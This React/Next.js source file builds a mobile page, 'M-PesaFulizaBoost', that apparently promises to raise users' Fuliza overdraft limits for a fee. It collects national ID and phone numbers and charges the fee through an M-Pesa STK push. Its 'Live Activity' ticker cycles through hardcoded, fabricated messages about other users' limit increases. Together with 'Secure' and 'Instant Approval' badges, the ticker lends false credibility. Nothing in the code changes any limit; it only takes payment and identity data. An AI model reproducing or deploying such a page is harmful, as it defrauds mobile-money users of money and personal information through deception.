'use client';

import React, { useState, useEffect, useRef } from 'react';
import { 
  ShieldCheck, Zap, Lock, Info, 
  CheckCircle2, Smartphone, Loader2, 
  X, ChevronRight, Wallet, AlertCircle, RefreshCw, XCircle
} from 'lucide-react';

// --- CONFIG ---
type LoanOption = { amount: number; fee: number };
type Step = 'SELECTION' | 'DETAILS' | 'CONFIRM' | 'PROCESSING' | 'STK_SENT' | 'SUCCESS' | 'FAILED' | 'CANCELLED';

const LOAN_OPTIONS: LoanOption[] = [
  { amount: 5000, fee: 49 },
  { amount: 7500, fee: 80 },
  { amount: 10000, fee: 120 },
  { amount: 12500, fee: 140 },
  { amount: 16000, fee: 180 },
  { amount: 21000, fee: 200 },
  { amount: 25500, fee: 220 },
  { amount: 30000, fee: 350 },
  { amount: 35000, fee: 420 },
  { amount: 40000, fee: 540 },
  { amount: 45000, fee: 680 },
  { amount: 50000, fee: 960 },
  { amount: 60000, fee: 1550 },
  { amount: 70000, fee: 2000 }
];

const TICKER_MESSAGES = [
  "0725****89 increased to Ksh 18,000 - just now",
  "0722****33 increased to Ksh 5,600 - 3 mins ago",
  "0713****12 increased to Ksh 13,200 - 9 mins ago",
  "0706****78 increased to Ksh 16,400 - just now"
];

export default function FulizaBoostPage() {
  const [step, setStep] = useState<Step>('SELECTION');
  const [selectedOption, setSelectedOption] = useState<LoanOption | null>(null);
  const [idNumber, setIdNumber] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [errors, setErrors] = useState<{ phone?: string; id?: string }>({});
  const [tickerIndex, setTickerIndex] = useState(0);
  const [isProcessing, setIsProcessing] = useState(false);
  
  // Polling Refs
  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Ticker Animation
  useEffect(() => {
    const interval = setInterval(() => {
      setTickerIndex((prev) => (prev + 1) % TICKER_MESSAGES.length);
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  // Clean up polling on unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    };
  }, []);

  // --- HANDLERS ---
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= 9) {
      setPhoneNumber(val);
      if (errors.phone) setErrors(prev => ({ ...prev, phone: undefined }));
    }
  };

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= 8) {
      setIdNumber(val);
      if (val.length >= 6 && errors.id) setErrors(prev => ({ ...prev, id: undefined }));
    }
  };

  const handleDetailsSubmit = () => {
    const newErrors: { phone?: string; id?: string } = {};
    if (!/^(7|1)\d{8}$/.test(phoneNumber)) newErrors.phone = "Enter a valid Safaricom number";
    if (idNumber.length < 6) newErrors.id = "ID must be at least 6 digits";

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    setStep('CONFIRM');
  };

  // --- API INTEGRATION ---
  const processPayment = async () => {
    if(!selectedOption) return;

    setIsProcessing(true);
    setErrors({}); // Clear errors

    try {
      // 1. Initiate STK Push
      const res = await fetch('/api/stkpush', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phoneNumber, // "712345678"
          amount: selectedOption.fee,
          idNumber: idNumber
        })
      });

      const data = await res.json();

      if (!data.success) {
        throw new Error(data.error || 'Payment failed to start');
      }

      // 2. STK Sent Successfully
      setStep('STK_SENT');
      setIsProcessing(false);
      
      // 3. Start Polling
      startPolling(data.checkoutRequestID);

    } catch (error: any) {
      console.error(error);
      setIsProcessing(false);
      setStep('FAILED');
    }
  };

  const startPolling = (reqId: string) => {
    // Clear existing poll
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);

    let attempts = 0;
    const maxAttempts = 60; // 2 minutes (60 * 2s)

    pollIntervalRef.current = setInterval(async () => {
      attempts++;
      
      if (attempts > maxAttempts) {
        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
        setStep('FAILED'); // Timeout
        return;
      }

      try {
        const res = await fetch(`/api/check-status?id=${reqId}`);
        const data = await res.json();

        if (data.status === 'COMPLETED') {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          setStep('SUCCESS');
        } else if (data.status === 'CANCELLED') {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          setStep('CANCELLED');
        } else if (data.status === 'FAILED') {
          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
          setStep('FAILED');
        }
        // If PENDING, do nothing, loop continues
      } catch (e) {
        // Ignore network blips during polling
        console.log("Polling error", e);
      }
    }, 2000); // Poll every 2 seconds
  };

  const handleReset = () => {
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    setStep('SELECTION');
    setSelectedOption(null);
    setIdNumber('');
    setPhoneNumber('');
    setErrors({});
  };

  const handleRetry = () => {
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    setStep('CONFIRM');
  };

  // --- RENDER ---
  const Header = () => (
    <div className="text-center pt-6 pb-2 px-4">
      <h1 className="text-2xl font-black text-slate-900 tracking-tight">
        M-Pesa<span className="text-blue-600">FulizaBoost</span>
      </h1>
      <p className="text-sm font-medium text-slate-600 mt-2 max-w-xs mx-auto leading-tight">
        Unlock higher limits instantly.<br/>
        <span className="text-slate-400 font-normal">No paperwork, just results.</span>
      </p>
    </div>
  );

  return (
    <div className="min-h-screen bg-slate-50 font-sans pb-10">
      <div className="max-w-md mx-auto min-h-screen bg-white shadow-xl overflow-hidden relative">
        <div className="absolute top-0 left-0 w-full h-64 bg-gradient-to-b from-blue-50/80 to-transparent z-0 pointer-events-none" />
        <div className="relative z-10">
          <Header />
          
          {step === 'SELECTION' && (
            <>
              <div className="mx-4 mb-6">
                <div className="bg-white/80 backdrop-blur border border-green-100 rounded-lg p-3 shadow-sm flex items-start gap-3">
                  <div className="bg-green-100 p-1 rounded-full animate-pulse">
                    <Zap className="w-3 h-3 text-green-700 fill-green-700" />
                  </div>
                  <div className="flex-1 overflow-hidden">
                    <p className="text-[10px] uppercase font-bold text-green-700 mb-0.5">Live Activity</p>
                    <p className="text-xs text-slate-700 font-medium whitespace-nowrap overflow-hidden text-ellipsis">
                      {TICKER_MESSAGES[tickerIndex]}
                    </p>
                  </div>
                </div>
              </div>
              
              <div className="px-4">
                <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-5 mb-6">
                  <div className="flex items-center justify-between mb-4">
                    <h2 className="font-bold text-slate-800 flex items-center gap-2">
                      <Wallet className="w-5 h-5 text-blue-600" />
                      Select Limit
                    </h2>
                    <span className="text-[10px] bg-blue-50 text-blue-600 px-2 py-1 rounded-full font-bold">Instant Approval</span>
                  </div>
                  <div className="grid grid-cols-2 gap-3">
                    {LOAN_OPTIONS.map((opt, idx) => (
                      <button
                        key={idx}
                        onClick={() => { setSelectedOption(opt); setTimeout(() => setStep('DETAILS'), 150); }}
                        className="group flex flex-col items-center justify-center p-3 rounded-xl border-2 border-slate-100 bg-slate-50 hover:border-blue-500 hover:bg-blue-50 hover:shadow-md transition-all duration-200 active:scale-95"
                      >
                        <span className="text-lg font-black text-slate-800 group-hover:text-blue-700">{opt.amount.toLocaleString()}</span>
                        <span className="text-[10px] font-semibold text-slate-400 bg-white px-2 py-0.5 rounded-full mt-1 border border-slate-100 group-hover:border-blue-200">Fee: {opt.fee}</span>
                      </button>
                    ))}
                  </div>
                </div>
                <div className="flex justify-between items-center px-1 gap-2">
                  {['Secure', 'Encrypted', 'Instant'].map((t, i) => (
                    <div key={i} className="flex-1 flex flex-col items-center p-2 bg-slate-50/80 rounded-lg border border-slate-100">
                      {i===0?<ShieldCheck className="w-4 h-4 text-green-600 mb-1"/>:i===1?<Lock className="w-4 h-4 text-green-600 mb-1"/>:<Zap className="w-4 h-4 text-green-600 mb-1"/>}
                      <span className="text-[10px] text-slate-500 font-bold whitespace-nowrap">{t}</span>
                    </div>
                  ))}
                </div>
              </div>
            </>
          )}

          {step === 'DETAILS' && (
            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-slate-900/60 backdrop-blur-sm animate-in fade-in">
              <div className="bg-white w-full max-w-md p-6 rounded-t-2xl sm:rounded-2xl shadow-2xl animate-in slide-in-from-bottom-20 duration-300">
                <div className="flex justify-between items-center mb-6">
                  <h3 className="text-lg font-bold text-slate-900">Verify Identity</h3>
                  <button onClick={() => setStep('SELECTION')} className="p-2 hover:bg-slate-100 rounded-full transition-colors"><X className="w-5 h-5 text-slate-400" /></button>
                </div>
                <div className="space-y-5">
                  <div>
                    <label className="text-xs font-bold text-slate-500 uppercase ml-1">ID Number</label>
                    <input type="tel" value={idNumber} onChange={handleIdChange} maxLength={8} placeholder="e.g. 12345678" className={`w-full h-12 px-4 mt-1 rounded-xl border-2 text-lg font-semibold outline-none transition-all ${errors.id ? 'border-red-500 bg-red-50' : 'border-slate-200 focus:border-blue-500'}`} />
                    {errors.id && <p className="text-xs text-red-500 mt-1 font-medium ml-1 flex items-center gap-1"><AlertCircle className="w-3 h-3"/> {errors.id}</p>}
                  </div>
                  <div>
                    <label className="text-xs font-bold text-slate-500 uppercase ml-1">M-Pesa Number</label>
                    <div className="relative mt-1">
                      <div className="absolute left-0 top-0 bottom-0 w-14 bg-slate-100 border-r border-slate-200 rounded-l-xl flex items-center justify-center font-bold text-slate-600 text-sm">+254</div>
                      <input type="tel" value={phoneNumber} onChange={handlePhoneChange} placeholder="7XX XXX XXX" className={`w-full h-12 pl-16 pr-4 rounded-xl border-2 text-lg font-semibold outline-none transition-all ${errors.phone ? 'border-red-500 bg-red-50' : 'border-slate-200 focus:border-blue-500'}`} />
                    </div>
                    {errors.phone && <p className="text-xs text-red-500 mt-1 font-medium ml-1 flex items-center gap-1"><AlertCircle className="w-3 h-3"/> {errors.phone}</p>}
                  </div>
                  <button onClick={handleDetailsSubmit} disabled={!idNumber || !phoneNumber} className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-slate-300 disabled:text-slate-500 text-white h-14 rounded-xl font-bold text-lg shadow-lg shadow-blue-200 flex items-center justify-center gap-2 mt-2 transition-all">Continue <ChevronRight className="w-5 h-5" /></button>
                </div>
              </div>
            </div>
          )}

          {step === 'CONFIRM' && selectedOption && (
            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-slate-900/60 backdrop-blur-sm animate-in fade-in">
              <div className="bg-white w-full max-w-md p-6 rounded-t-2xl sm:rounded-2xl shadow-2xl animate-in slide-in-from-bottom-20 duration-300">
                <div className="text-center mb-6">
                  <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3 border border-blue-100"><Wallet className="w-8 h-8 text-blue-600" /></div>
                  <h3 className="text-xl font-black text-slate-900">Confirm Activation</h3>
                  <p className="text-sm text-slate-500">You are activating a new limit</p>
                </div>
                <div className="bg-slate-50 rounded-xl p-5 border border-slate-200 space-y-4 mb-6">
                  <div className="flex justify-between items-center pb-4 border-b border-slate-200/60"><span className="text-sm text-slate-500 font-medium">New Fuliza Limit</span><span className="text-xl font-black text-blue-600">KES {selectedOption.amount.toLocaleString()}</span></div>
                  <div className="flex justify-between items-center text-sm"><span className="text-slate-500">Processing Fee</span><span className="font-bold text-slate-900">KES {selectedOption.fee}</span></div>
                  <div className="flex justify-between items-center text-sm"><span className="text-slate-500">M-Pesa Number</span><span className="font-bold text-slate-900">0{phoneNumber}</span></div>
                </div>
                <button onClick={processPayment} disabled={isProcessing} className="w-full bg-[#00A529] hover:bg-[#008f24] active:scale-[0.98] text-white h-14 rounded-xl font-bold text-lg shadow-lg shadow-green-100 flex items-center justify-center gap-2 transition-all">
                  {isProcessing ? <Loader2 className="animate-spin" /> : "Pay & Activate"}
                </button>
                <button onClick={() => setStep('DETAILS')} disabled={isProcessing} className="w-full mt-3 py-3 text-slate-500 font-bold text-sm hover:text-slate-700">Cancel</button>
              </div>
            </div>
          )}

          {step === 'STK_SENT' && (
             <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-slate-900/60 backdrop-blur-sm">
                <div className="bg-white w-full max-w-md p-8 rounded-t-2xl sm:rounded-2xl shadow-2xl text-center">
                    <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 relative">
                        <div className="absolute inset-0 rounded-full border-4 border-green-200 animate-ping opacity-20"></div>
                        <Smartphone className="w-10 h-10 text-green-600" />
                    </div>
                    <h3 className="text-xl font-black text-slate-900 mb-2">Check your phone</h3>
                    <p className="text-slate-600 mb-6 text-sm">We sent an M-Pesa request to <span className="font-bold text-slate-900">0{phoneNumber}</span>. Enter your PIN to complete.</p>
                    <div className="flex items-center justify-center gap-2 text-xs font-bold text-slate-500 bg-slate-100 py-3 rounded-xl"><Loader2 className="w-4 h-4 animate-spin text-blue-600" /> Waiting for payment confirmation...</div>
                </div>
             </div>
          )}

          {step === 'SUCCESS' && selectedOption && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-white p-4 animate-in zoom-in-95 duration-300">
               <div className="w-full max-w-md">
                  <div className="text-center mb-8">
                    <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-green-200"><CheckCircle2 className="w-12 h-12 text-white" /></div>
                    <h2 className="text-3xl font-black text-slate-900 mb-2">Successful!</h2>
                    <p className="text-slate-500">Your limit upgrade is processed.</p>
                  </div>
                  <div className="bg-blue-50 border-l-4 border-blue-500 p-5 rounded-r-xl mb-8">
                     <h4 className="font-bold text-blue-800 text-sm mb-2 flex items-center gap-2"><Info className="w-4 h-4" /> Activation Steps</h4>
                     <p className="text-xs text-blue-900/80 mb-3">If your limit of <strong className="text-blue-700">KES {selectedOption.amount.toLocaleString()}</strong> doesn't reflect immediately:</p>
                     <ul className="text-xs text-blue-800 font-medium space-y-2 ml-1">
                        <li className="flex gap-2"><span className="bg-blue-200 text-blue-800 w-5 h-5 rounded-full flex items-center justify-center text-[10px] shrink-0">1</span>Dial *234# on your phone</li>
                        <li className="flex gap-2"><span className="bg-blue-200 text-blue-800 w-5 h-5 rounded-full flex items-center justify-center text-[10px] shrink-0">2</span>Select "Opt Out" of Fuliza</li>
                        <li className="flex gap-2"><span className="bg-blue-200 text-blue-800 w-5 h-5 rounded-full flex items-center justify-center text-[10px] shrink-0">3</span>Wait 2 mins, then "Opt In" again</li>
                     </ul>
                  </div>
                  <button onClick={handleReset} className="w-full bg-slate-900 text-white h-14 rounded-xl font-bold text-lg shadow-lg">Done</button>
               </div>
            </div>
          )}

          {step === 'CANCELLED' && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-in fade-in">
              <div className="bg-white w-full max-w-md p-6 rounded-2xl shadow-2xl text-center">
                <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4"><XCircle className="w-8 h-8 text-orange-600" /></div>
                <h3 className="text-xl font-black text-slate-900 mb-2">Request Cancelled</h3>
                <p className="text-sm text-slate-600 mb-6">The payment request was cancelled or timed out. You did not enter your PIN.</p>
                <div className="space-y-3">
                  <button onClick={handleRetry} className="w-full bg-blue-600 text-white h-12 rounded-xl font-bold flex items-center justify-center gap-2"><RefreshCw className="w-4 h-4" /> Try Again</button>
                  <button onClick={handleReset} className="w-full text-slate-500 font-bold text-sm py-2">Close</button>
                </div>
              </div>
            </div>
          )}

          {step === 'FAILED' && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-in fade-in">
              <div className="bg-white w-full max-w-md p-6 rounded-2xl shadow-2xl text-center">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4"><AlertCircle className="w-8 h-8 text-red-600" /></div>
                <h3 className="text-xl font-black text-slate-900 mb-2">Transaction Failed</h3>
                <p className="text-sm text-slate-600 mb-6">We could not process the payment. Please check your M-Pesa balance or network and try again.</p>
                <div className="space-y-3">
                  <button onClick={handleRetry} className="w-full bg-slate-900 text-white h-12 rounded-xl font-bold flex items-center justify-center gap-2"><RefreshCw className="w-4 h-4" /> Retry Payment</button>
                  <button onClick={handleReset} className="w-full text-slate-500 font-bold text-sm py-2">Cancel</button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}